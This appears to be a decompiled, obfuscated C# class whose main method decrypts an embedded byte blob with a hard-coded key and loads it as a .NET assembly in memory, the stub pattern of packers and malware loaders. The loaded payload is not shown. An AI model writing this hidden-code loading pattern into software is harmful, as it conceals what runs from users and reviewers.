using System;
using System.Reflection;

namespace ns0;

internal sealed class Class3
{
	public static void smethod_0()
	{
		smethod_3();
	}

	private static byte[] smethod_1(string string_0)
	{
		byte[] array = new byte[string_0.Length * 2];
		Buffer.BlockCopy(string_0.ToCharArray(), 0, array, 0, array.Length);
		return array;
	}

	public static PropertyInfo smethod_2(BindingFlags bindingFlags_0, PropertyInfo[] propertyInfo_0, Type type_0, Type[] type_1, ParameterModifier[] parameterModifier_0)
	{
		int i = 0;
		int num = 0;
		int num2 = ((type_1 != null) ? type_1.Length : 0);
		for (int j = 0; j < propertyInfo_0.Length; j++)
		{
			if (type_1 != null)
			{
				ParameterInfo[] indexParameters = propertyInfo_0[j].GetIndexParameters();
				if (indexParameters.Length != num2)
				{
					continue;
				}
				for (i = 0; i < num2; i++)
				{
					Type parameterType = indexParameters[i].ParameterType;
					if (parameterType != type_1[i] && parameterType != typeof(object) && !parameterType.IsPrimitive && !parameterType.IsAssignableFrom(type_1[i]))
					{
						break;
					}
				}
			}
			if (i == num2 && (!(type_0 != null) || propertyInfo_0[j].PropertyType.IsPrimitive || propertyInfo_0[j].PropertyType.IsAssignableFrom(type_0)))
			{
				propertyInfo_0[num++] = propertyInfo_0[j];
			}
		}
		switch (num)
		{
		case 0:
			return null;
		case 1:
			return propertyInfo_0[0];
		default:
		{
			int num3 = 0;
			int[] array = new int[num2];
			for (int j = 0; j < num2; j++)
			{
				array[j] = j;
			}
			for (int j = 1; j < num; j++)
			{
			}
			return propertyInfo_0[num3];
		}
		}
	}

	internal static void smethod_3()
	{
		Class6.assembly_0 = Assembly.Load(Class7.smethod_2(Class8.smethod_0(), smethod_1("+_))(*&!@^")));
	}
}
